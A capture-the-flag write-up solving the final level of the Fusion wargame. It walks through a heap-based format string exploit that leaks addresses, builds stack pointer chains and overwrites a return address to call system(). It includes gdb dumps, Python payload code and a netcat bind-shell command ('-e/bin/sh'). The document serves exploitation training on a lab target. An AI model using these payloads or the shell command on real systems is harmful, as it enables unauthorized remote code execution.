# level14
The end of the year always helps me speed up things regarding my hobbies, I have more time to do some not work related things. Same happened here, finally I managed to solve all levels of Fusion after almost a year. That's what happens when you do all sort of things besides your hobby.  
level14 is the last level and had no write-up yet, this should be the first one.

## Pre-exploitation
If you start to poke around in the binary you will see that the webpage is not quite right, even though the stack and heap are randomized as excepted because ASLR was turned on when the source was compiled, the webpage says no it has PIE. It has, the base and everything else is randomized as well. It doesn't really matter for us as you will see, because it is a format string exploitation level again. The website says it's heap, which was disturbing and strange for me at first, but after I read some articles about format strings I realized the webpage was right. In this exercise both variables are on the heap that are used in the vulnerable *snprintf()* function. Why is that important? Because *\*printf()* reads every parameter from the stack, and we can't write to stack directly, our parameter will be put on the heap instead of stack.
It is highly recommended to read these two articles about format string exploitation:
- \[1\] [Exploiting Format String Vulnerabilities](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)
- \[2\] [Advances in format string exploitation - 0x0b, Issue 0x3b, Phile #0x07 of 0x12](http://phrack.org/issues/59/7.html)  

To understand this write-up it is necessary to have some experience or at least the papers read.

## Heap trouble
As you can find in the articles, most of the format string vulnerabilities are stack based. All of the supplied variables reside on the stack (or at least one) so somehow you can influence the behaviour of the function. You can put some values on stack and later use those as addresses in the memory to write to. By design when the *\*printf()* functions are called they pick the necessary pointers and values from stack, so we need to find a new way to put values/pointers on the stack before calling the *\*printf()* function. The two articles (mostly the second one) explains it very well and presents several techniques. Unfortunately these techniques are not working on Linux glibc, so we have to do some tricks. Probably this technique (which is based on a specific scenario) is already published somewhere and I'm not the only one who did this (this is very likely since it is an exercise)

## Looking for chains
We are going to check the pointers that are already on stack when the function is called. Let's connect to the service and send lots of **"%08x"** to get the content of the stack.
```
(gdb) attach 4618  
Attaching to process 4618
...
(gdb) b snprintf
Breakpoint 1 at 0xb753d1f0: file snprintf.c, line 30.
(gdb) c
Continuing.

Breakpoint 1, __snprintf (s=0xb7c41268 "", maxlen=2048, 
    format=0xb7c4016c "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."...)
    at snprintf.c:30
30	snprintf.c: No such file or directory.
	in snprintf.c
(gdb) display/i $pc
1: x/i $pc
=> 0xb753d1f0 <__snprintf>:	push   %ebx
(gdb) ni
...
(gdb) 
0xb753d21e	35	in snprintf.c
1: x/i $pc
=> 0xb753d21e <__snprintf+46>:	call   0xb7555cf0 <_IO_vsnprintf>
(gdb) x/80wx $esp
0xbfdd4ef8:	0xb7c41268	0x00000800	0xb7c4016c	0xbfdd4f1c
0xbfdd4f08:	0xb7c40158	0xb77d1208	0xb7c41268	0x00000800
0xbfdd4f18:	0xb7c4016c	0xb7c40a10	0xb77d0700	0x00000000
0xbfdd4f28:	0xbfdd5140	0xb7c40a10	0xb77d0700	0x00000000
0xbfdd4f38:	0xb75622e3	0xb7c40a10	0xb77d10d0	0x00000000
0xbfdd4f48:	0xb7c40158	0xb77d10d0	0x00000000	0xb7c40158
0xbfdd4f58:	0xbfdd4f4c	0x00000000	0x00000000	0xb768d000
0xbfdd4f68:	0xb76a13b8	0x000e3120	0xbfdd4f30	0xb7c41228
0xbfdd4f78:	0xb766aff4	0xb766c400	0xb7c40030	0x00000000
0xbfdd4f88:	0xb756594d	0xb75658e0	0xb7c40990	0xb776fff4
0xbfdd4f98:	0xb77d0070	0xb773a80f	0xb7c40990	0xb74c8190
0xbfdd4fa8:	0xb7562d8e	0xb777c058	0xb77d0070	0xb7c40030
0xbfdd4fb8:	0x00000000	0xb77d012c	0xb7c40158	0xbfdd4ff4
0xbfdd4fc8:	0x00000154	0xb7c40030	0xb77d10d0	0x00000000
0xbfdd4fd8:	0xb7c40158	0x00000000	0xb777c058	0x00000154
0xbfdd4fe8:	0xb77d10d0	0x00000000	0xb7c40158	0x00000000
0xbfdd4ff8:	0xb777c058	0x00000154	0xbfdd4fd0	0x00000000
0xbfdd5008:	0x00000000	0x00000001	0xb7c40990	0xb77d0070
0xbfdd5018:	0xb7c40990	0xb77ca8a9	0xb7c40030	0xb7c40990
0xbfdd5028:	0x00000000	0xb777c058	0x00000000	0x00000004
```

Response from the server:
```
root@kali:~/fusion/level14# nc 172.16.193.195 20014
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
b7c40a10.b77d0700.00000000.bfdd5140.b7c40a10.b77d0700.00000000.b75622e3.b7c40a10.b77d10d0.00000000.b7c40158.b77d10d0.00000000.b7c40158.bfdd4f4c.00000000.00000000.b768d000.b76a13b8.000e3120.bfdd4f30.b7c41228.b766aff4.b766c400.b7c40030.00000000.b756594d.b75658e0.b7c40990.b776fff4.b77d0070.b773a80f.b7c40990.b74c8190.b7562d8e.b777c058.b77d0070.b7c40030.00000000.b77d012c.b7c40158.bfdd4ff4.00000154.b7c40030.b77d10d0.00000000.b7c40158.00000000.b777c058.00000154.b77d10d0.00000000.b7c40158.00000000.b777c058.00000154.bfdd4fd0.00000000.00000000.00000001.b7c40990.b77d0070.b7c40990.b77ca8a9.b7c40030.b7c40990.00000000
```

*snprintf()* leaks from **$esp+36**, so we can address any other 4bytes that comes after. **%1$x** points to **$esp+36**, **$2%x** points to **$esp+40** an so on... We need to find a pointer on stack which points to the stack, you can even find longer chains, but we need only one pointer at the moment (possibly two to have a shorter exploit). Before you start to look for one, it is best to look farther on, too close values on the stack mean we are picking (and later altering) values on stack that are related to the called function or to the caller or to the caller of the caller and so on. Farther is better, but we have to make sure we are still in the stack frame. We are going to modify some values on stack, so if we can keep those values in an area that never changes while we are minding our business we don't have to expect a crash, which is a good thing. The service works in a loop, so outer functions won't be accessed while we are crafting our payload, we need to aim for that stack partition.  
**%256$x** will be just good for us. It points to **%263$x** which points to somewhere on the stack. Unfortunately the latter points to an address on stack which can't be divided with 4, so it is not aligned. We need to modify that address to point to something proper. We'll do that later.

## Info leaks
The best thing about format string exploits is that you don't have to worry about PIE and ASLR, you can get almost any kind of address from stack reliably. In this case we want to know the base address of some module, address of a heap variable and some stack addresses (explained above).
- **%1$x** leaks heap, we can use it to have a pointer to our payload which will be the shell command (*-0x78c8*)
- **%4$x** leaks stack, we can use it to have a reliable pointer to the ret address of the function (*+0x234*)
- **%6$x** leaks level14 module address (*+0xb700*)
- **%256$x** leaks the address of **%263$x** which has to be aligned and modified step-by-step
- **%263$x** not important for us

Our stack looks like this:
> [1:heap][2:doesnt][3:matter][4:stackleak]...[6:level14leak]...[256:pointer-to-263]...[263:pointer-to-stack-to-xxx+2]...[xxx:DEADBABE][xxx+1:B00BE555] ---> direction to the bottom

We can start to play with these leaks and can reliably tell the base of any module loaded (PIE is out of the game) so we know the *exit()* and *system()* function addresses; furthermore we know some pointers to the stack which helps us determine the value of the ret address of the *sprintf()* and to create some pointers on stack. Additionally we have a pointer to the heap (basically to the secondly allocated variable) which can be used as a relative pointer to our payload (ASLR protection is gone).


## Aligning the stack
As in all format string exploits we want to write arbitrary 4bytes to arbitrary addresses, for example to change a GOT entry. Because of the fact that this is a heap based format string vulnerability, we can't write the stack easily, but this is why we looked for a chain on stack.  
First we have to modify the address on **%263$x**, because it is not divisible by 4, so if we write something to the address which it points to, it won't be addressable (on the stack "figure" above **%263$x** points to the value *0xBABEB00B*, we want it to point to *0xDEADBABE*). Because it already points to the stack, the upper 16bits of its value is good for us, so we only have to modify the lower 16bits with a short write. (*+0x30* makes sure it points farther than the stack will be used in the program)

```
alignedstack = (stackp2p & 0xFFFFFFFC) + 0x30
bw = 0x00
p2pbytelo = ((alignedstack - bw) & 0xFFFF) 
payload0  = "%"+str(p2pbytelo)+"x%256$hn" # aligning the stack!
payload0 += "\n\x00"
```

Now we have a proper pointer on stack which can be used to write arbitrary two bytes. After aligning, the stack looks like this:
> [1:heap]...[4:stackleak]...[6:level14leak]...[256:pointer-to-263]...[263:pointer-to-275]...[275:DEADBABE] ---> direction to the bottom


## Writing addresses
We have a pointer that points to a pointer that points to the stack. With this structure we can write arbitrary addresses on the bottom of the stack which will be readable for our heap based format string vulnerability. When we are ready with this, we basically turned our heap based vulnerability to a stack based, so it will act as any other stack based format string vulnerability.
In 6*2 steps we are going to write 2bytes on the stack and modify the pointer to point to the next two bytes. At the end we will have 6 consequential overlapping addresses on stack which can be used to write 3 arbitrary dwords - 12bytes.

```
def generate_formatstring(value, align):
        time.sleep(0.5)

        bw = 0x00
        byte = (((value & 0xFFFF) - bw) & 0xFFFF)
        bw += byte
        alignaddr = ((alignedstack - bw + align) & 0xFFFF)

        payload  = "%"+str(byte)+"x%263$hn" # set half byte on previously set address
        payload += "%"+str(alignaddr)+"x%256$hn" # set addr to next half byte
        payload += "\n\x00"

        return payload
```
By looping the *align* variable each cycle will generate two format strings that write on the stack and then loops the pointer to the next two bytes.
```
for i in range(1,7):
        s.send(generate_formatstring(stackrop + (i-1)*2, i*4-2))
        s.recv(BUFFER_SIZE)
        s.send(generate_formatstring(stackrop >> 0x10, i*4))
        s.recv(BUFFER_SIZE)
        print "[+] %d. value set" % i
```

After the loop our stack will look like this:
> [1:heap]...[4:stackleak]...[6:level14leak]...[256:pointer-to-263]...[263:pointer-to-280 +2]...[275:retaddr][276:retaddr+2][277:retaddr+4][278:retaddr+6][279:retaddr+8][280:retaddr+10] ---> direction to the bottom


## Final steps

We have 6 different addresses on stack, crafted by ourselves. All of these are fully addressable by our format string vulnerability by **%275$x** to **%280$x**. In the Info leak section we managed to get a reliable address that points to the ret address of the *snprintf()* function; if we change that address the function will return to a different location. If we change more dwords on that memory location, we can create a ROP chain with our gadgets. Our chain will look like this:
> [system()][exit()][payload-from-heap]

We already have all the necessary addresses leaked in the Info leak section, we only have to write these to our crafted pointers.
```
payloadx  = "/bin/nc.traditional -ltp 1337 -e/bin/sh;" # eat this system()!
payloadx += "%"+str(bytelo1)+"x%275$hn%"+str(bytehi1)+"x%276$hn" # ret to system
payloadx += "%"+str(bytelo2)+"x%277$hn%"+str(bytehi2)+"x%278$hn" # exit() pointer
payloadx += "%"+str(bytelo3)+"x%279$hn%"+str(bytehi3)+"x%280$hn" # heap addr that points to this payload
payloadx += "\n\x00"
```
- *byte[lo|hi]1* stores *system()*'s address from libc
- *byte[lo|hi]2* stores *exit()*'s address from libpthread
- *byte[lo|hi]3* stores the pointer to the payload prefixed the format string

By overwriting the ret address and the following two dwords we have our ROP chain placed on stack. The function returns to *system()* with our payload and executes the command.

Twitter: [@xoreipeip](https://twitter.com/xoreipeip)



